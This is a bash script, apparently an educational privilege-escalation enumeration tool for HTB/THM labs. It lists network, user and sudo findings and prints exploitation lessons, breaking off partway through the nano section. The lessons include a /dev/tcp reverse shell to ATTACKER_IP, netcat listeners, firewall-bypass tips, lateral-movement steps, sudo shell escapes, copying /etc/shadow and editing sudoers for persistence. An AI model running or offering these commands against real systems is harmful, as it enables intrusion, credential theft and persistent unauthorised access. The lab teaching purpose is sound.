#!/bin/bash
# LearnPeas -  Privilege Escalation In-Field Educational Tool
# Comprehensive enumeration + education for HTB/THM environments

set -o pipefail

# === COLORS ===
R='\033[31m' G='\033[32m' Y='\033[33m' B='\033[34m' 
P='\033[35m' C='\033[36m' W='\033[37m' RST='\033[0m'
# Critical alert colors (red background + white text)
CRIT='\033[41m\033[1;97m'
# CTF flag alert (purple background + white text)
FLAG='\033[45m\033[1;97m'

# === CONFIGURATION ===
VERBOSE=0
EXPLAIN=1
QUICK_MODE=0
EXTENDED=1
SHOW_FLAGS=0  # ADD THIS LINE
LOG_FILE="/tmp/teachpeas_$(date +%s).log"

# === LOGGING ===
log() { echo -e "$1" | tee -a "$LOG_FILE"; }
section() { log "\n${C}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RST}\n${C}$1${RST}\n${C}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RST}"; }
vuln() { log "${R}[VULNERABLE]${RST} $1"; }
info() { log "${B}[INFO]${RST} $1"; }
ok() { log "${G}[OK]${RST} $1"; }
warn() { log "${Y}[WARNING]${RST} $1"; }
teach() { [ $EXPLAIN -eq 1 ] && log "${Y}[LEARN]${RST} $1"; }
critical() { log "${CRIT}[!!! CRITICAL !!!]${RST} $1"; }
ctf_flag() { log "${FLAG}[🚩 CTF FLAG 🚩]${RST} $1"; }  # ADD THIS LINE

# === EDUCATIONAL FRAMEWORK ===
explain_concept() {
    local title="$1"
    local what="$2"
    local why="$3"
    local how="$4"
    
    [ $EXPLAIN -eq 0 ] && return
    
    log "\n${P}╔═══════════════════════════════════════╗${RST}"
    log "${P}║  UNDERSTANDING: $title"
    log "${P}╚═══════════════════════════════════════${RST}"
    log "${W}WHAT:${RST} $what"
    log "${W}WHY IT MATTERS:${RST} $why"
    log "${W}HOW TO EXPLOIT:${RST} $how"
    log ""
}

# === SYSTEM FINGERPRINT ===
enum_system() {
    section "SYSTEM FINGERPRINT"
    
    local os=$(grep PRETTY_NAME /etc/os-release 2>/dev/null | cut -d'"' -f2 || echo "Unknown")
    local kernel=$(uname -r)
    local arch=$(uname -m)
    local hostname=$(hostname)
    
    info "OS: $os"
    info "Kernel: $kernel"
    info "Architecture: $arch"
    info "Hostname: $hostname"
    info "Current User: $(whoami)"
    info "User ID: $(id)"
    
    teach "System fingerprinting reveals:"
    teach "  • Kernel version → CVE lookup on exploit-db"
    teach "  • OS distribution → Default package configurations"
    teach "  • Architecture → Binary compatibility (x86_64, i386, ARM)"
    teach "  • User groups → Special privileges (docker, lxd, disk, etc.)"
}

# === ENHANCED NETWORK ENUMERATION ===
enum_network() {
    section "NETWORK CONFIGURATION"
    
    local found_localhost_services=0
    local found_internal_networks=0
    local found_firewall_restrictions=0
    local found_arp_hosts=0
    
    # === CHECK 1: Network Interfaces ===
    info "Network interfaces:"
    if command -v ip >/dev/null 2>&1; then
        ip addr show 2>/dev/null | grep -E "^[0-9]+:|inet " | while read line; do
            log "  $line"
        done
    else
        ifconfig 2>/dev/null | grep -E "^[a-z]|inet " | head -20 | while read line; do
            log "  $line"
        done
    fi
    
    # === CHECK 2: Active Connections with Service Identification ===
    info "Active network connections with service identification:"
    
    if command -v ss >/dev/null 2>&1; then
        # Parse ss output for listening services
        ss -tulpn 2>/dev/null | grep LISTEN | while read line; do
            local proto=$(echo "$line" | awk '{print $1}')
            local local_addr=$(echo "$line" | awk '{print $5}')
            local process=$(echo "$line" | grep -oE 'users:\(\("[^"]*"' | cut -d'"' -f2)
            
            # Extract IP and port
            local ip=$(echo "$local_addr" | rev | cut -d: -f2- | rev)
            local port=$(echo "$local_addr" | rev | cut -d: -f1 | rev)
            
            # Identify service type and context
            local service_name=""
            local risk_level=""
            local exploitation=""
            
            case "$port" in
                22)
                    service_name="SSH"
                    risk_level="info"
                    ;;
                80|8080|8000)
                    service_name="HTTP Web Server"
                    risk_level="info"
                    ;;
                443|8443)
                    service_name="HTTPS Web Server"
                    risk_level="info"
                    ;;
                3306)
                    service_name="MySQL/MariaDB"
                    if echo "$ip" | grep -qE "127\.0\.0\.1|::1"; then
                        risk_level="warn"
                        exploitation="Likely no auth required - access after gaining shell"
                        found_localhost_services=1
                    else
                        risk_level="info"
                        exploitation="Try default credentials: root:root, root:password"
                    fi
                    ;;
                5432)
                    service_name="PostgreSQL"
                    if echo "$ip" | grep -qE "127\.0\.0\.1|::1"; then
                        risk_level="warn"
                        exploitation="Localhost only - likely passwordless trust authentication"
                        found_localhost_services=1
                    fi
                    ;;
                6379)
                    service_name="Redis"
                    if echo "$ip" | grep -qE "127\.0\.0\.1|::1"; then
                        risk_level="critical"
                        exploitation="Redis on localhost - usually NO AUTH! Write cron jobs or SSH keys"
                        found_localhost_services=1
                    else
                        risk_level="warn"
                        exploitation="Try: redis-cli -h $ip ping"
                    fi
                    ;;
                9200|9300)
                    service_name="Elasticsearch"
                    if echo "$ip" | grep -qE "127\.0\.0\.1|::1"; then
                        risk_level="warn"
                        exploitation="Elasticsearch on localhost - no auth by default"
                        found_localhost_services=1
                    else
                        risk_level="warn"
                        exploitation="Check: curl http://$ip:9200/_cat/indices"
                    fi
                    ;;
                11211)
                    service_name="Memcached"
                    risk_level="warn"
                    exploitation="No authentication - read cached session data"
                    found_localhost_services=1
                    ;;
                27017)
                    service_name="MongoDB"
                    if echo "$ip" | grep -qE "127\.0\.0\.1|::1"; then
                        risk_level="warn"
                        exploitation="MongoDB on localhost - often no auth"
                        found_localhost_services=1
                    fi
                    ;;
                5672|15672)
                    service_name="RabbitMQ"
                    risk_level="info"
                    exploitation="Default creds: guest:guest (only works from localhost)"
                    if echo "$ip" | grep -qE "127\.0\.0\.1|::1"; then
                        found_localhost_services=1
                    fi
                    ;;
                8009)
                    service_name="Apache Tomcat AJP"
                    risk_level="warn"
                    exploitation="Check for Ghostcat vulnerability (CVE-2020-1938)"
                    ;;
                *)
                    service_name="Unknown"
                    risk_level="info"
                    ;;
            esac
            
            # Output based on risk level
            if echo "$ip" | grep -qE "127\.0\.0\.1|::1"; then
                # Localhost-only service
                case "$risk_level" in
                    critical)
                        critical "LOCALHOST service: $service_name on port $port (Process: $process)"
                        vuln "Service only accessible from localhost: $local_addr"
                        [ -n "$exploitation" ] && teach "  $exploitation"
                        ;;
                    warn)
                        warn "LOCALHOST service: $service_name on port $port (Process: $process)"
                        [ -n "$exploitation" ] && teach "  $exploitation"
                        ;;
                    *)
                        info "Localhost: $service_name on port $port (Process: $process)"
                        ;;
                esac
                
            elif echo "$ip" | grep -qE "0\.0\.0\.0|::|\*"; then
                # Externally accessible
                if [ "$risk_level" = "critical" ] || [ "$risk_level" = "warn" ]; then
                    warn "EXTERNAL service: $service_name on port $port (Process: $process)"
                    [ -n "$exploitation" ] && teach "  $exploitation"
                else
                    info "External: $service_name on port $port (Process: $process)"
                fi
            else
                # Specific interface
                info "Listening on $ip:$port - $service_name (Process: $process)"
            fi
        done
    elif command -v netstat >/dev/null 2>&1; then
        netstat -tulpn 2>/dev/null | grep LISTEN | while read line; do
            local local_addr=$(echo "$line" | awk '{print $4}')
            local process=$(echo "$line" | awk '{print $NF}')
            
            if echo "$local_addr" | grep -qE "127\.0\.0\.1|::1"; then
                warn "LOCALHOST-ONLY service: $local_addr (Process: $process)"
                found_localhost_services=1
            else
                info "Listening: $local_addr (Process: $process)"
            fi
        done
    fi
    
    # === CONDITIONAL EDUCATION: Localhost Services ===
    if [ $found_localhost_services -eq 1 ]; then
        log ""
        teach "╔═══════════════════════════════════════════════════════════╗"
        teach "║  LOCALHOST SERVICES - Why They Matter"
        teach "╚═══════════════════════════════════════════════════════════"
        teach ""
        teach "WHAT ARE LOCALHOST SERVICES:"
        teach "  Services bound to 127.0.0.1 (localhost) are only accessible"
        teach "  from the machine itself, not from the network."
        teach ""
        teach "WHY THEY'RE VULNERABLE:"
        teach "  Admins assume 'if it's localhost-only, it's safe' so they:"
        teach "  • Disable authentication (no password needed)"
        teach "  • Use weak/default credentials"
        teach "  • Don't apply security patches"
        teach "  • Enable dangerous features"
        teach ""
        teach "  The thinking: 'Only I can access it, so why secure it?'"
        teach "  The reality: After YOU get a shell, YOU can access it too."
        teach ""
        teach "HOW TO EXPLOIT:"
        teach "  1. Get initial shell access (any user, any method)"
        teach "  2. From that shell: curl http://localhost:PORT"
        teach "  3. Service often has no auth or weak auth"
        teach "  4. Exploit service for privilege escalation"
        teach ""
        teach "COMMON LOCALHOST SERVICES:"
        teach "  • MySQL on 127.0.0.1:3306"
        teach "    - Often trusts local connections without password"
        teach "    - Can read/write files if running as root"
        teach ""
        teach "  • Redis on 127.0.0.1:6379"
        teach "    - Usually NO authentication at all"
        teach "    - Can write to filesystem (cron jobs, SSH keys)"
        teach ""
        teach "  • Elasticsearch on 127.0.0.1:9200"
        teach "    - No auth by default"
        teach "    - Can extract sensitive data"
        teach ""
        teach "PORT FORWARDING (Access from Your Machine):"
        teach "  If you want to access localhost service from your computer:"
        teach "  SSH tunnel: ssh -L 8080:localhost:3306 user@target"
        teach "  Then on your machine: mysql -h 127.0.0.1 -P 8080"
        log ""
    fi
    
    # === CHECK 3: Routing Table Analysis ===
    info "Routing table (potential pivot targets):"
    
    if command -v ip >/dev/null 2>&1; then
        ip route 2>/dev/null | while read line; do
            log "  $line"
            
            # Skip VPN interfaces (tun/tap) and default routes for pivot detection
            if echo "$line" | grep -qE "tun|tap|default"; then
                continue
            fi
            
            # Identify internal network routes (but only first occurrence)
            if echo "$line" | grep -qE "^10\.|^172\.(1[6-9]|2[0-9]|3[01])\.|^192\.168\."; then
                if [ $found_internal_networks -eq 0 ]; then
                    local network=$(echo "$line" | awk '{print $1}')
                    warn "Internal network detected: $network"
                    found_internal_networks=1
                fi
            fi
        done
    else
        route -n 2>/dev/null | tail -n +3 | while read line; do
            log "  $line"
            if echo "$line" | grep -qE "^10\.|^172\.(1[6-9]|2[0-9]|3[01])\.|^192\.168\."; then
                found_internal_networks=1
            fi
        done
    fi
    
    # === CONDITIONAL EDUCATION: Internal Networks ===
    if [ $found_internal_networks -eq 1 ]; then
        log ""
        teach "╔═══════════════════════════════════════════════════════════╗"
        teach "║  INTERNAL NETWORKS - Lateral Movement Opportunities"
        teach "╚═══════════════════════════════════════════════════════════"
        teach ""
        teach "WHAT ARE INTERNAL NETWORKS:"
        teach "  Private IP ranges not routable on the internet:"
        teach "  • 10.0.0.0/8        (10.x.x.x)"
        teach "  • 172.16.0.0/12     (172.16-31.x.x)"
        teach "  • 192.168.0.0/16    (192.168.x.x)"
        teach ""
        teach "WHY THEY MATTER:"
        teach "  These networks contain other machines you can't reach from"
        teach "  the internet. Once you compromise ONE machine in the network,"
        teach "  you can pivot to attack the others."
        teach ""
        teach "  Think of it like breaking into a building:"
        teach "  • External network = outside the building (public internet)"
        teach "  • Internal network = inside the building (private network)"
        teach "  • Once you're inside, you can access other rooms"
        teach ""
        teach "TYPICAL SCENARIO (HTB/Corporate):"
        teach "  [Internet] → [DMZ Server] → [Internal Network]"
        teach "               ↑ You are here"
        teach ""
        teach "  You compromise DMZ server (web server, VPN, etc.)"
        teach "  From there, you can reach internal machines:"
        teach "  • Database servers"
        teach "  • File servers"
        teach "  • Domain controllers"
        teach "  • Employee workstations"
        teach ""
        teach "HOW TO DISCOVER OTHER MACHINES:"
        teach "  1. Ping sweep (fast but noisy):"
        teach "     for i in {1..254}; do"
        teach "       ping -c1 -W1 192.168.1.\$i 2>/dev/null && echo 192.168.1.\$i is up"
        teach "     done"
        teach ""
        teach "  2. Nmap scan (more thorough):"
        teach "     nmap -sn 192.168.1.0/24  # Host discovery"
        teach "     nmap -p- 192.168.1.50    # Port scan specific host"
        teach ""
        teach "  3. ARP scan (very quiet):"
        teach "     arp-scan --local"
        teach ""
        teach "LATERAL MOVEMENT STRATEGY:"
        teach "  1. Discover other hosts (as above)"
        teach "  2. Scan for services"
        teach "  3. Try credentials from current machine"
        teach "  4. Look for SSH keys in /home/*/.ssh/"
        teach "  5. Check for password reuse"
        teach "  6. Pivot to next machine, repeat"
        log ""
    fi
    
    # === CHECK 4: Firewall Rules ===
    info "Checking firewall configuration..."
    
    # iptables
    if command -v iptables >/dev/null 2>&1; then
        if iptables -L -n 2>/dev/null | grep -qE "Chain|target"; then
            info "iptables rules detected"
            
            # Check if we can read the rules
            local rule_count=$(iptables -L -n 2>/dev/null | grep -cE "^ACCEPT|^DROP|^REJECT")
            if [ $rule_count -gt 0 ]; then
                info "Found $rule_count firewall rules"
                
                # Check for common blocks
                if iptables -L OUTPUT -n 2>/dev/null | grep -qE "REJECT|DROP"; then
                    warn "Outbound traffic may be filtered - could block reverse shells"
                    found_firewall_restrictions=1
                fi
                
                if iptables -L INPUT -n 2>/dev/null | grep -qE "REJECT|DROP"; then
                    info "Inbound filtering detected - may limit bind shells"
                    found_firewall_restrictions=1
                fi
                
                # Check if rules are readable in detail
                if iptables -L -n -v 2>/dev/null | head -20 | grep -q "."; then
                    teach "  View full rules: iptables -L -n -v"
                fi
            else
                ok "iptables installed but no restrictive rules detected"
            fi
        fi
    fi
    
    # nftables
    if command -v nft >/dev/null 2>&1; then
        if nft list tables 2>/dev/null | grep -q "table"; then
            info "nftables is active"
            local table_count=$(nft list tables 2>/dev/null | wc -l)
            warn "Found $table_count nftables - may restrict connections"
            found_firewall_restrictions=1
            teach "  View rules: nft list ruleset"
        fi
    fi
    
    # ufw
    if command -v ufw >/dev/null 2>&1; then
        local ufw_status=$(ufw status 2>/dev/null | head -1)
        if echo "$ufw_status" | grep -qi "active"; then
            warn "UFW firewall is ACTIVE"
            found_firewall_restrictions=1
            teach "  Check rules: ufw status verbose"
        elif echo "$ufw_status" | grep -qi "inactive"; then
            ok "UFW firewall is inactive"
        fi
    fi
    
    # firewalld
    if command -v firewall-cmd >/dev/null 2>&1; then
        if systemctl is-active --quiet firewalld 2>/dev/null; then
            warn "firewalld is ACTIVE"
            found_firewall_restrictions=1
            teach "  Check zones: firewall-cmd --get-active-zones"
            teach "  List rules: firewall-cmd --list-all"
        fi
    fi
    
    # === CONDITIONAL EDUCATION: Firewall Restrictions ===
    if [ $found_firewall_restrictions -eq 1 ]; then
        log ""
        teach "╔═══════════════════════════════════════════════════════════╗"
        teach "║  FIREWALLS - Why Your Reverse Shell Won't Connect"
        teach "╚═══════════════════════════════════════════════════════════"
        teach ""
        teach "WHAT FIREWALLS DO:"
        teach "  Block/allow network connections based on rules:"
        teach "  • Source/destination IP addresses"
        teach "  • Port numbers"
        teach "  • Direction (inbound/outbound)"
        teach "  • Protocol (TCP/UDP)"
        teach ""
        teach "WHY THIS AFFECTS YOU:"
        teach "  Your typical reverse shell:"
        teach "  bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"
        teach "         ↑"
        teach "  This creates OUTBOUND connection to port 4444"
        teach "  If firewall blocks outbound to port 4444 = shell fails"
        teach ""
        teach "FIREWALL TYPES:"
        teach "  1. iptables (traditional)"
        teach "  2. nftables (modern replacement)"
        teach "  3. ufw (user-friendly wrapper for iptables)"
        teach "  4. firewalld (Red Hat/CentOS)"
        teach ""
        teach "COMMON CONFIGURATIONS:"
        teach "  • Allow outbound 80 (HTTP)"
        teach "  • Allow outbound 443 (HTTPS)"
        teach "  • Allow outbound 53 (DNS)"
        teach "  • Block everything else"
        teach ""
        teach "BYPASS TECHNIQUES:"
        teach ""
        teach "  1. Use allowed ports:"
        teach "     On attacker: nc -lvnp 443"
        teach "     On target: bash -i >& /dev/tcp/ATTACKER/443 0>&1"
        teach ""
        teach "  2. Use DNS tunneling (if DNS allowed):"
        teach "     Tools: iodine, dnscat2"
        teach ""
        teach "  3. Use ICMP (ping) tunneling:"
        teach "     Tools: icmpsh, ptunnel"
        teach ""
        teach "  4. HTTP/HTTPS reverse shells:"
        teach "     Harder to detect/block"
        teach "     Tools: Metasploit http(s) payloads"
        teach ""
        teach "HOW TO TEST:"
        teach "  From compromised machine:"
        teach "  nc -zv ATTACKER_IP 4444    # Test port 4444"
        teach "  nc -zv ATTACKER_IP 443     # Test port 443"
        teach "  nc -zv ATTACKER_IP 80      # Test port 80"
        teach ""
        teach "  Whichever succeeds, use that port for reverse shell"
        log ""
    fi
    
    # === CHECK 5: ARP Cache (Nearby Hosts) ===
    if command -v arp >/dev/null 2>&1; then
        local arp_entries=$(arp -a 2>/dev/null | grep -oE '([0-9]{1,3}\.){3}[0-9]{1,3}' | sort -u)
        local host_count=$(echo "$arp_entries" | grep -v "^$" | wc -l)
        
        if [ $host_count -gt 1 ]; then
            info "Found $host_count hosts in ARP cache (lateral movement targets):"
            echo "$arp_entries" | head -10 | while read host; do
                log "  $host"
            done
            found_arp_hosts=1
        fi
    fi
    
    # === CONDITIONAL EDUCATION: ARP Cache ===
    if [ $found_arp_hosts -eq 1 ]; then
        log ""
        teach "╔═══════════════════════════════════════════════════════════╗"
        teach "║  ARP CACHE - Finding Nearby Machines"
        teach "╚═══════════════════════════════════════════════════════════"
        teach ""
        teach "WHAT IS ARP:"
        teach "  Address Resolution Protocol maps IP addresses to MAC addresses"
        teach "  on the local network. When machine A talks to machine B:"
        teach "  1. A asks: 'Who has IP 192.168.1.50?' (ARP request)"
        teach "  2. B responds: 'I do, my MAC is aa:bb:cc:dd:ee:ff'"
        teach "  3. A caches this: 192.168.1.50 = aa:bb:cc:dd:ee:ff"
        teach ""
        teach "WHY THE CACHE MATTERS:"
        teach "  The ARP cache shows which machines this host has RECENTLY"
        teach "  communicated with. These are your lateral movement targets."
        teach ""
        teach "WHAT IT TELLS YOU:"
        teach "  • Other machines on same network segment"
        teach "  • Recently active hosts (not old DNS records)"
        teach "  • Machines this host regularly talks to"
        teach ""
        teach "EXPLOITATION:"
        teach "  These hosts are on the same local network, meaning:"
        teach "  • No firewall between you and them (usually)"
        teach "  • Fast network connection"
        teach "  • May trust this machine"
        teach "  • May have shared credentials"
        teach ""
        teach "NEXT STEPS:"
        teach "  1. Port scan these hosts: nmap -sn <IP>"
        teach "  2. Try credentials from current machine"
        teach "  3. Check /home/*/.ssh/ for SSH keys to these hosts"
        teach "  4. Look for config files mentioning these IPs"
        log ""
    fi
    
    # === CHECK 6: Network Namespaces ===
    if [ -d /var/run/netns ] && [ "$(ls -A /var/run/netns 2>/dev/null)" ]; then
        warn "Network namespaces detected - possible container/virtualization"
        ls /var/run/netns 2>/dev/null | while read ns; do
            info "  Namespace: $ns"
        done
        teach "May indicate container environment - check enum_container section"
    fi
    
    # === Summary ===
    log ""
    if [ $found_localhost_services -eq 1 ] || [ $found_internal_networks -eq 1 ] || [ $found_firewall_restrictions -eq 1 ] || [ $found_arp_hosts -eq 1 ]; then
        info "Network enumeration complete - review findings above"
    else
        ok "Network enumeration complete - no significant attack vectors found"
    fi
}
# === USER ENUMERATION ===
enum_users() {
    section "USER ENUMERATION"
    
    info "Interactive users (UID >= 1000):"
    awk -F: '$3 >= 1000 && $1 != "nobody" {print "  " $1 " (UID: " $3 ")"}' /etc/passwd
    
    info "Users with shells:"
    grep -E "/(bash|sh|zsh|fish)$" /etc/passwd | cut -d: -f1 | while read u; do
        log "  $u"
    done
    
    # Check for sudo group members
    if getent group sudo >/dev/null 2>&1; then
        info "Members of sudo group:"
        getent group sudo | cut -d: -f4 | tr ',' '\n' | while read u; do
            log "  $u"
        done
    fi
    
    teach "User enumeration reveals:"
    teach "  • Potential lateral movement targets"
    teach "  • Users with sudo access (sudo group)"
    teach "  • Service accounts vs. real users"
}

# === COMPREHENSIVE SUDO ANALYSIS ===
enum_sudo() {
    section "SUDO PERMISSIONS ANALYSIS"
    
    # === PHASE 1: SILENT SCAN - COLLECT ALL DATA ===
    local sudo_output=$(sudo -l 2>&1)
    local has_sudo=0
    local has_nopasswd=0
    local has_all_all=0
    local has_all_all_nopasswd=0
    local has_env_keep=0
    local has_ld_preload=0
    local has_ld_library_path=0
    local has_setenv=0
    local has_runas_all=0
    local has_passwd_required=0
    local found_exploitable_bins=0
    local found_wildcards=0
    local found_relative_paths=0
    local found_shell_wrappers=0
    local sudo_version=""
    
    # Temporary files for organizing findings
    local temp_bins="/tmp/.learnpeas_sudo_bins_$$"
    local temp_wildcards="/tmp/.learnpeas_sudo_wildcards_$$"
    local temp_relative="/tmp/.learnpeas_sudo_relative_$$"
    local temp_wrappers="/tmp/.learnpeas_sudo_wrappers_$$"
    
    # Cleanup on exit
    cleanup_sudo_temps() {
        rm -f "$temp_bins" "$temp_wildcards" "$temp_relative" "$temp_wrappers" 2>/dev/null
    }
    trap cleanup_sudo_temps RETURN
    
    # Quick exit if no sudo at all
    if echo "$sudo_output" | grep -qi "not allowed\|password.*incorrect\|may not run sudo\|unknown user"; then
        ok "No sudo access available"
        return
    fi
    
    has_sudo=1
    
    # Get sudo version for vulnerability correlation
    if command -v sudo >/dev/null 2>&1; then
        sudo_version=$(sudo -V 2>/dev/null | head -1 | grep -oE '[0-9]+\.[0-9]+\.[0-9]+[a-z]?[0-9]*')
    fi
    
    # Analyze sudo -l output for various attack vectors
    while IFS= read -r line; do
        # Skip comments and headers
        echo "$line" | grep -qE "^#|^Matching|^User.*may run" && continue
        
        # Check for NOPASSWD
        if echo "$line" | grep -q "NOPASSWD"; then
            has_nopasswd=1
            
            # Extract the command/binary
            local cmd=$(echo "$line" | sed 's/.*NOPASSWD://g' | sed 's/.*) //g' | awk '{print $1}' | tr -d ',')
            
            if [ -n "$cmd" ]; then
                # Check for wildcards
                if echo "$cmd" | grep -q '\*'; then
                    echo "$line" >> "$temp_wildcards"
                    found_wildcards=1
                fi
                
                # Check for relative paths (no leading /)
                if ! echo "$cmd" | grep -q '^/'; then
                    echo "$line|$cmd" >> "$temp_relative"
                    found_relative_paths=1
                fi
                
                # Check if it's a shell wrapper script
                if [ -f "$cmd" ] && [ -x "$cmd" ]; then
                    if head -1 "$cmd" 2>/dev/null | grep -q '^#!.*sh'; then
                        echo "$line|$cmd" >> "$temp_wrappers"
                        found_shell_wrappers=1
                    fi
                fi
                
                echo "$cmd" >> "$temp_bins"
                found_exploitable_bins=1
            fi
        fi
        
        # Check for (ALL:ALL) ALL patterns
        if echo "$line" | grep -qE '\(ALL\s*:?\s*ALL\)\s*ALL'; then
            has_all_all=1
            if echo "$line" | grep -q "NOPASSWD"; then
                has_all_all_nopasswd=1
            else
                has_passwd_required=1
            fi
        fi
        
        # Check for SETENV tag
        if echo "$line" | grep -q "SETENV"; then
            has_setenv=1
        fi
        
        # Check for env_keep
        if echo "$line" | grep -q "env_keep"; then
            has_env_keep=1
            
            echo "$line" | grep -q "LD_PRELOAD" && has_ld_preload=1
            echo "$line" | grep -q "LD_LIBRARY_PATH" && has_ld_library_path=1
        fi
        
        # Check for (ALL) or (ALL:ALL) in RUNAS
        if echo "$line" | grep -qE '\(ALL[: ].*\)'; then
            has_runas_all=1
        fi
        
    done < <(echo "$sudo_output")
    
    # === PHASE 2: CONDITIONAL EDUCATION (ONLY IF ISSUES FOUND) ===
    local total_issues=$((has_all_all + has_nopasswd + has_env_keep + has_setenv + found_wildcards + found_relative_paths))
    
    if [ $total_issues -gt 0 ]; then
        log ""
        teach "╔════════════════════════════════════════════════════════════════╗"
        teach "║  SUDO PRIVILEGE ESCALATION - COMPREHENSIVE GUIDE"
        teach "╚════════════════════════════════════════════════════════════════╝"
        teach ""
        teach "WHAT IS SUDO:"
        teach "  'sudo' (superuser do) allows authorized users to run commands"
        teach "  as another user, typically root. It's configured in /etc/sudoers."
        teach ""
        teach "HOW SUDO WORKS (THE SECURITY MODEL):"
        teach "  1. User runs: sudo <command>"
        teach "  2. Sudo checks /etc/sudoers for permissions"
        teach "  3. If allowed, prompts for USER's password (not root's)"
        teach "  4. Validates password against /etc/shadow"
        teach "  5. Executes command with elevated privileges"
        teach "  6. Caches credentials for 15 minutes (default)"
        teach ""
        teach "SUDOERS FILE FORMAT:"
        teach "  user  host=(runas_user:runas_group) tags: commands"
        teach ""
        teach "  Example breakdown:"
        teach "  bob   ALL=(ALL:ALL) NOPASSWD: /usr/bin/vim, /bin/cat"
        teach "   │     │    │   │      │        └─ Allowed commands"
        teach "   │     │    │   │      └─ No password required"
        teach "   │     │    │   └─ Can run as any group"
        teach "   │     │    └─ Can run as any user (including root)"
        teach "   │     └─ On all hosts"
        teach "   └─ Username"
        teach ""
        teach "WHY SUDO MISCONFIGURATIONS EXIST:"
        teach ""
        teach "  Convenience Over Security:"
        teach "    Admin needs to automate tasks → adds NOPASSWD"
        teach "    Developer needs frequent root access → grants (ALL:ALL)"
        teach "    Script needs one root command → gives broad permissions"
        teach ""
        teach "  Lack of Understanding:"
        teach "    Admin thinks: 'vim only edits files, it's safe'"
        teach "    Reality: vim can spawn shells, execute commands, read/write any file"
        teach ""
        teach "  Incremental Creep:"
        teach "    Starts with: bob ALL=(ALL) /usr/bin/systemctl restart apache2"
        teach "    User needs more: bob ALL=(ALL) /usr/bin/systemctl *"
        teach "    Gets annoying: bob ALL=(ALL) NOPASSWD: /usr/bin/systemctl *"
        teach "    Eventually: bob ALL=(ALL) NOPASSWD: ALL"
        teach ""
        teach "THE FUNDAMENTAL PROBLEM:"
        teach "  Many programs can do MORE than their intended purpose:"
        teach "  • Text editors → spawn shells (:!/bin/bash)"
        teach "  • File viewers → execute commands (!sh)"
        teach "  • Interpreters → import os; os.system('/bin/bash')"
        teach "  • Utilities → find . -exec /bin/bash \\; -quit"
        teach ""
        teach "  Admins grant access to the PROGRAM, not realizing it can"
        teach "  be abused to gain full shell access."
        log ""
    fi
    
    # === PHASE 3: REPORT SPECIFIC FINDINGS ===
    
    # Finding 1: Unrestricted sudo access
    if [ $has_all_all_nopasswd -eq 1 ]; then
        critical "UNRESTRICTED SUDO (NO PASSWORD) - Instant root access"
        vuln "Configuration: (ALL:ALL) NOPASSWD: ALL"
        log ""
        teach "╔════════════════════════════════════════════════════════════════╗"
        teach "║  UNRESTRICTED SUDO - THE NUCLEAR OPTION"
        teach "╚════════════════════════════════════════════════════════════════╝"
        teach ""
        teach "WHAT THIS MEANS:"
        teach "  You can run ANY command as ANY user without entering a password."
        teach "  This is functionally equivalent to having root's password."
        teach ""
        teach "WHY IT EXISTS:"
        teach "  • Lazy system administration"
        teach "  • Automation/scripts that can't provide passwords"
        teach "  • Development/testing environments"
        teach "  • 'Temporary' fix that became permanent"
        teach ""
        teach "INSTANT EXPLOITATION:"
        teach "  sudo /bin/bash          # Direct root shell"
        teach "  sudo su                 # Switch to root user"
        teach "  sudo -s                 # Start shell as root"
        teach "  sudo -i                 # Login shell as root"
        teach ""
        teach "NO EVASION NEEDED:"
        teach "  This is the simplest privilege escalation possible."
        teach "  No tricks, no bypasses, no exploits required."
        log ""
        
    elif [ $has_all_all -eq 1 ]; then
        critical "UNRESTRICTED SUDO (PASSWORD REQUIRED) - Root with your password"
        vuln "Configuration: (ALL:ALL) ALL"
        log ""
        teach "╔════════════════════════════════════════════════════════════════╗"
        teach "║  UNRESTRICTED SUDO WITH PASSWORD"
        teach "╚════════════════════════════════════════════════════════════════╝"
        teach ""
        teach "WHAT THIS MEANS:"
        teach "  You can run ANY command as root, but must enter YOUR password."
        teach ""
        teach "EXPLOITATION:"
        teach "  If you know your own password:"
        teach "    sudo /bin/bash"
        teach "    [enter your password]"
        teach "    # root shell"
        teach ""
        teach "  If you DON'T know your password:"
        teach "    • Try default passwords (password, username, admin)"
        teach "    • Check for password in files (.bash_history, config files)"
        teach "    • Brute force (risky, may lock account)"
        teach "    • Look for other privilege escalation vectors"
        log ""
    fi
    
    # Finding 2: NOPASSWD binaries with detailed exploitation
    if [ $found_exploitable_bins -eq 1 ]; then
        critical "NOPASSWD BINARIES DETECTED - Shell escape vectors available"
        log ""
        
        # Process each unique binary
        sort -u "$temp_bins" 2>/dev/null | while read bin; do
            [ -z "$bin" ] && continue
            
            local basename=$(basename "$bin" 2>/dev/null || echo "$bin")
            vuln "NOPASSWD SUDO: $bin"
            log ""
            
            # Provide detailed exploitation per binary type
            case $basename in
                # === TEXT EDITORS ===
                vim|vi)
                    teach "╔════════════════════════════════════════════════════════════════╗"
                    teach "║  VIM/VI EXPLOITATION - MULTIPLE METHODS"
                    teach "╚════════════════════════════════════════════════════════════════╝"
                    teach ""
                    teach "WHY VIM IS DANGEROUS:"
                    teach "  Vim is a text editor with extensive scripting capabilities."
                    teach "  It can execute shell commands, read/write files, and spawn shells."
                    teach ""
                    teach "METHOD 1 - Direct Shell Spawn (Fastest):"
                    teach "  sudo $bin -c ':!/bin/bash'"
                    teach "  sudo $bin -c ':sh'"
                    teach ""
                    teach "METHOD 2 - Interactive Shell Escape:"
                    teach "  sudo $bin"
                    teach "  :set shell=/bin/bash"
                    teach "  :shell"
                    teach ""
                    teach "METHOD 3 - Execute Commands Without Full Shell:"
                    teach "  sudo $bin -c ':!whoami'"
                    teach "  sudo $bin -c ':!cat /etc/shadow'"
                    teach ""
                    teach "METHOD 4 - Read/Write Any File:"
                    teach "  sudo $bin /etc/shadow"
                    teach "  :w /tmp/shadow_copy"
                    teach ""
                    teach "METHOD 5 - Modify Sudoers (If You Want Persistence):"
                    teach "  sudo $bin /etc/sudoers"
                    teach "  # Add: $(whoami) ALL=(ALL) NOPASSWD: ALL"
                    teach ""
                    teach "WHY ADMINS GRANT THIS:"
                    teach "  Thought process: 'They only need to edit config files'"
                    teach "  Reality: Vim can do anything the shell can do"
                    ;;
                    
                nano)
                    teach "╔════════════════════════════════════════════════════════════════╗"
                    teach "║  NANO EXPLOITATION"
                    teach "╚════════════════════════════════════════════════════════════════╝"
                    teach ""
                    teach "WHY NANO IS EXPLOITABLE:"
                    teach "  While simpler than vim, nano can still execute commands"
                    teach "  via its read/write external command feature."
                    teach ""
                    teach "METHOD 1 - Command Execution:"
                    teach "  sudo $bin"
